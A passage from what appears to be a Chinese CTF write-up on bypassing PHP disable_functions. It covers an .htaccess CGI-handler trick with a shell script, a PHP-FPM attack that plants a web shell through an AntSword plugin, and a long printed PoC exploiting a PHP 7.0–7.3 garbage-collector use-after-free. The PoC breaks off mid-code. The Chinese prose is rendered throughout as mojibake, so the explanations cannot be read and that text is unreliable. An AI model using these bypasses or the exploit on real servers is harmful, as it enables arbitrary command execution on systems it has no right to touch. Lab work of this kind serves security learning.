href="https://so.csdn.net/so/search?q=%E8%A7%A3%E9%87%8A%E5%99%A8&spm=1001.2101.3001.7020">è§£é‡Šå™¨</a>æˆ–PHPè§£é‡Šå™¨ã€‚ä¹Ÿå°±æ˜¯è¯´å°†è¿™äº›è§£é‡Šå™¨åšæˆæ¨¡å—çš„æ–¹å¼ï¼ŒWebæœåŠ¡å™¨ä¼šåœ¨å¯åŠ¨çš„æ—¶å€™å°±å¯åŠ¨è¿™äº›è§£é‡Šå™¨ã€‚å½“æœ‰æ–°çš„åŠ¨æ€è¯·æ±‚è¿›æ¥æ—¶ï¼ŒWebæœåŠ¡å™¨å°±æ˜¯è‡ªå·±è§£æè¿™äº›åŠ¨æ€è„šæœ¬ï¼Œçœå¾—é‡æ–°Forkä¸€ä¸ªè¿›ç¨‹ï¼Œæ•ˆç‡æé«˜äº†ã€‚</p><p>Apacheåœ¨é…ç½®å¼€å¯CGIåå¯ä»¥ç”¨ScriptAliasæŒ‡ä»¤æŒ‡å®šä¸€ä¸ªç›®å½•ï¼ŒæŒ‡å®šçš„ç›®å½•ä¸‹é¢ä¾¿å¯ä»¥å­˜æ”¾å¯æ‰§è¡Œçš„CGIç¨‹åºã€‚è‹¥æ˜¯æƒ³ä¸´æ—¶å…è®¸ä¸€ä¸ªç›®å½•å¯ä»¥æ‰§è¡ŒCGIç¨‹åºå¹¶ä¸”ä½¿å¾—æœåŠ¡å™¨å°†è‡ªå®šä¹‰çš„åç¼€è§£æä¸ºCGIç¨‹åºæ‰§è¡Œï¼Œåˆ™å¯ä»¥åœ¨ç›®çš„ç›®å½•ä¸‹ä½¿ç”¨htaccessæ–‡ä»¶è¿›è¡Œé…ç½®ï¼Œå¦‚ä¸‹ï¼š</p><blockquote><p>Options +ExecCGIAddHandler cgi-script .xxx</p></blockquote><p>è¿™æ ·ä¾¿ä¼šå°†å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰çš„.xxxæ–‡ä»¶å½“åšCGIç¨‹åºæ‰§è¡Œäº†ã€‚</p><p><strong>å³webæœåŠ¡å™¨é‡åˆ°åŠ¨æ€è¯·æ±‚æ—¶ï¼Œå³ç½‘é¡µä¸Šçš„æ•°æ®æ˜¯ä»æ•°æ®åº“ä¸­æˆ–è€…å…¶å®ƒåœ°æ–¹è°ƒç”¨çš„è¯·æ±‚ï¼ŒwebæœåŠ¡å™¨å°±ä¼šäº¤ç»™CGIå¤„ç†ï¼Œä¾‹å¦‚phpè§£é‡Šå™¨ï¼Œç„¶ååœ¨é…ç½®æ–‡ä»¶ï¼ˆå¦‚htaccessï¼‰ä¸­å¯ä»¥è®¾ç½®æŸæŸåç¼€ä»¥CGIç¨‹åºè¿è¡Œå°±å¯ä»¥ç»•è¿‡disable_functions</strong></p><h3 id="åˆ©ç”¨æ–¹æ³•-1"><a href="#åˆ©ç”¨æ–¹æ³•-1" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h3><p>è¿™é‡Œç”¨<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3">èšå‰‘çš„docker</a>åšç¯å¢ƒå¤ç°ï¼Œå¦‚æœè§‰å¾—éº»çƒ¦ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ctfhubä¸Šç”¨ç°æˆçš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061657058.png" alt="image-20231206165740013"><br>æ‰§è¡Œä¸€ä¸‹phpinfoçœ‹çœ‹ç¦ç”¨å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv,</span><br></pre></td></tr></table></figure><p>å¤§éƒ¨åˆ†éƒ½è¢«ç¦ç”¨äº†ï¼Œèšå‰‘è¿æ¥ç„¶åå»ç»•è¿‡<br>webç›®å½•ä¸‹ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .ant</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ shell.ant</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo Content-type: text/html</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">echo&amp;&amp;id</span><br></pre></td></tr></table></figure><p>ç”±äºç›®æ ‡æ˜¯liunxç³»ç»Ÿ,linuxä¸­CGIæ¯”è¾ƒä¸¥æ ¼ã€‚è¿™é‡Œä¹Ÿéœ€è¦å»liunxç³»ç»Ÿåˆ›å»ºæ–‡ä»¶ä¸Šä¼ ,å¦‚æœä½¿ç”¨windowsåˆ›å»ºæ–‡ä»¶å¹¶ä¸Šä¼ æ˜¯æ— æ³•è§£æçš„ã€‚è¿™é‡Œæˆ‘æ¯”è¾ƒå¬è¯ç›´æ¥å»Linuxä¸Šåˆ›å»ºäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061658850.png" alt="image-20231206165804798"><br>ç›´æ¥è®¿é—®shell.antå‡ºé”™ï¼Œæƒé™é—®é¢˜<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061658036.png" alt="image-20231206165813940"><br>ç›´æ¥ä½¿ç”¨èšå‰‘ä¿®æ”¹æƒé™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061658107.png" alt="image-20231206165823026"><br>ç„¶åå†è®¿é—®å¯çœ‹åˆ°å‘½ä»¤æ‰§è¡ŒæˆåŠŸ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061659170.png" alt="image-20231206165847169"><br>ç»æµ‹è¯•è¿™é‡Œcatã€ifconfigç­‰å‘½ä»¤ç”¨ä¸äº†ï¼Œctfhubå¯ä»¥ç”¨ifconfigä½†æ˜¯catä¹Ÿç”¨ä¸äº†tacå¯ç”¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061659525.png" alt="image-20231206165953463"></p><p>åé¢å‘ç°åº”è¯¥æ˜¯æˆ‘å‚»é€¼äº†ï¼Œcatçš„flagï¼Œä½†æ˜¯flagæ˜¯ç›´æ¥catä¸äº†çš„</p><h2 id="åˆ©ç”¨æ”»å‡»PHP-FPM"><a href="#åˆ©ç”¨æ”»å‡»PHP-FPM" class="headerlink" title="åˆ©ç”¨æ”»å‡»PHP-FPM"></a>åˆ©ç”¨æ”»å‡»PHP-FPM</h2><p>FPMå…¶å®æ˜¯ä¸€ä¸ªfastcgiåè®®è§£æå™¨ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†ç”¨æˆ·è¯·æ±‚æŒ‰ç…§fastcgiçš„è§„åˆ™æ‰“åŒ…å¥½é€šè¿‡TCPä¼ ç»™FPMã€‚FPMæŒ‰ç…§fastcgiçš„åè®®å°†TCPæµè§£ææˆçœŸæ­£çš„æ•°æ®ï¼Œå¾—åˆ°æ‰§è¡Œè¯¥å‡½æ•°çš„ç¯å¢ƒå˜é‡ã€‚PHP-FPMæ‹¿åˆ° fastcgiçš„æ•°æ®åŒ…åï¼Œè¿›è¡Œè§£æï¼Œç„¶åæ‰§è¡Œ <code>SCRIPT_FILENAME</code>çš„å€¼æŒ‡å‘çš„phpæ–‡ä»¶ã€‚<br><a href="https://www.php.cn/faq/455614.html">è¯¦è§£PHPä¸­PHP-FPMæ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆç”¨ï¼Ÿ-phpæ•™ç¨‹-PHPä¸­æ–‡ç½‘</a></p><h3 id="åˆ©ç”¨æ¡ä»¶-7"><a href="#åˆ©ç”¨æ¡ä»¶-7" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>Linux æ“ä½œç³»ç»Ÿ</li><li>PHP-FPM</li><li>å­˜åœ¨å¯å†™çš„ç›®å½•, éœ€è¦ä¸Šä¼  .so æ–‡ä»¶</li></ul><h3 id="åˆ©ç”¨åŸç†-1"><a href="#åˆ©ç”¨åŸç†-1" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>å‚è€ƒ<a href="https://xz.aliyun.com/t/5598#toc-3">æµ…æphp-fpmçš„æ”»å‡»æ–¹å¼ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a>æ„Ÿè§‰æŒºéº»çƒ¦çš„ï¼Œä¸æƒ³çœ‹äº†</p><h3 id="åˆ©ç”¨æ–¹æ³•-2"><a href="#åˆ©ç”¨æ–¹æ³•-2" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h3><p>è¿™é‡Œæˆ‘ç›´æ¥ç”¨ctfhubä¸Šçš„ç¯å¢ƒäº†<br>é¦–å…ˆæ‰§è¡Œä¸€ä¸‹phpinfo()æŸ¥çœ‹æ˜¯å¦é…ç½®äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061701130.png" alt="image-20231206170102069"><br>å¯ä»¥çœ‹åˆ°é…ç½®äº†<code>FPM/FastCGI</code>ç„¶åç›´æ¥ä½¿ç”¨æ’ä»¶ç»•è¿‡ï¼Œè¿™ä¸ªæ¨¡å¼éœ€è¦è‡ªå·±æ‰¾é…ç½®æ–‡ä»¶æŸ¥æ‰¾FPMæ¥å£åœ°å€<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061701985.png" alt="image-20231206170133906"><br>é»˜è®¤çš„æ˜¯ <code>unix:///</code> æœ¬åœ° socket è¿™ç§çš„,å¦‚æœé…ç½®æˆ TCP çš„é»˜è®¤æ˜¯ <code>127.0.0.1:9000</code>å¦‚ä¸‹ï¼Œé…ç½®æ–‡ä»¶ä½ç½®ä¸º&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;zz-docker.conf<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702911.png" alt="image-20231206170202849"><br>å¼€å§‹æ‰§è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702524.png" alt="image-20231206170215436"><br>æˆåŠŸåå¯ä»¥çœ‹åˆ° åœ¨<code>/var/www/html/</code> ç›®å½•ä¸‹æœ‰ä¸ª <code>.antproxy.php</code> æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702871.png" alt="image-20231206170226812"><br>ç„¶åè¿æ¥è¿™ä¸ªshellå³å¯å‘½ä»¤æ‰§è¡Œï¼Œæ’ä»¶ä¸Šä¼ çš„shellå¯†ç ä¹Ÿæ˜¯æ²¡æœ‰å˜çš„ï¼Œè¿æ¥ä¹‹åå³å¯æ‰§è¡Œå‘½ä»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702352.png" alt="image-20231206170234295"></p><h2 id="åˆ©ç”¨-GC-UAF"><a href="#åˆ©ç”¨-GC-UAF" class="headerlink" title="åˆ©ç”¨ GC UAF"></a>åˆ©ç”¨ GC UAF</h2><p>åˆ©ç”¨çš„æ˜¯PHP garbage collectorç¨‹åºä¸­çš„å †æº¢å‡ºè§¦å‘ï¼Œå½±å“èŒƒå›´ä¸º7.0-1.3<br>è¿™ä¸ªpwnçš„ä¹Ÿå°±ä¸ç ”ç©¶äº†</p><h3 id="åˆ©ç”¨æ¡ä»¶-8"><a href="#åˆ©ç”¨æ¡ä»¶-8" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>Linux æ“ä½œç³»ç»Ÿ</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 - all versions to date</li></ul><h3 id="åˆ©ç”¨æ–¹æ³•-3"><a href="#åˆ©ç”¨æ–¹æ³•-3" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h3><p>ç›´æ¥ç”¨ctfhubç¯å¢ƒï¼Œç”¨èšå‰‘æ’ä»¶æ¥ç»•è¿‡<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702075.png" alt="image-20231206170249979"><br>ä¹Ÿæœ‰ç°æˆçš„è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;tac /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> 